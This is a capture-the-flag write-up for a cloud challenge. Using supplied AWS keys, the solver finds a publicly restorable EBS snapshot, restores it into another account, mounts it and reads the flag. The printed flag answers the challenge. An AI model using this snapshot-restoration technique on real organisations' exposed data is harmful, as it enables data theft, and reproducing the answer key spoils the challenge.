# Attachment Issues

## Description

It’s always the “final-backup” ones that get forgotten. Especially when they’re left drifting.

```json
{
    "AccessKey": {
        "UserName": "ctf-user",
        "AccessKeyId": "AKIAS32GSDY7NS3TLGJD",
        "Status": "Active",
        "SecretAccessKey": "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",
        "CreateDate": "2026-03-26T06:06:06+00:00"
    }
}
```

Flag Format: hackzero{}

## Writeup

Jumping to the crust of it I used enumerate IAM tool and realised I could use the provided credentials to list snapshots.

```bash
aws ec2 describe-snapshots --owner-ids self --region ap-south-1
```

```json
{
    "Snapshots": [
        {
            "StorageTier": "standard",
            "TransferType": "standard",
            "CompletionTime": "2026-03-26T06:00:54.223000+00:00",
            "FullSnapshotSizeInBytes": 54525952,
            "SnapshotId": "snap-0c9fb7ec3494e18d0",
            "VolumeId": "vol-0131d64f0c8bcda2f",
            "State": "completed",
            "StartTime": "2026-03-26T06:00:22.010000+00:00",
            "Progress": "100%",
            "OwnerId": "197179612734",
            "Description": "final-backup",
            "VolumeSize": 1,
            "Encrypted": false
        }
    ]
}
```

This was the intended target since the description says "final-backup". To confirm the snapshot had been exposed in a way that other AWS accounts could restore it, the next check was:

```bash
aws ec2 describe-snapshots --snapshot-ids snap-0c9fb7ec3494e18d0 --restorable-by-user-ids all --region ap-south-1
```

The snapshot showed up there as well confirming that it was public and restorable by any AWS account. Using a separate AWS account in the same region, a new EBS volume was created directly from the public snapshot (I did not run these commands myself I had to ask my friend to run these for me since I am awsless):

```bash
aws ec2 create-volume --snapshot-id snap-0c9fb7ec3494e18d0 --availability-zone ap-south-1a --region ap-south-1
```

That returned a fresh volume ID. After that, the new volume was attached to an EC2 instance:

```bash
aws ec2 attach-volume --volume-id <volume-id> --instance-id <your-instance-id> --device /dev/xvdf
```

Then, we can login into the EC2 machine and the volume is attached as `/dev/nvme1n1` which we can directly mount to the machine.

```bash
sudo mkdir /mnt/test && sudo mount /dev/nvme1n1 /mnt/test
```

The flag was directly found at `/mnt/test/flag.txt`.

## Flag

`hackzero{b302a261a01885fb6170d8951859a3c9}`
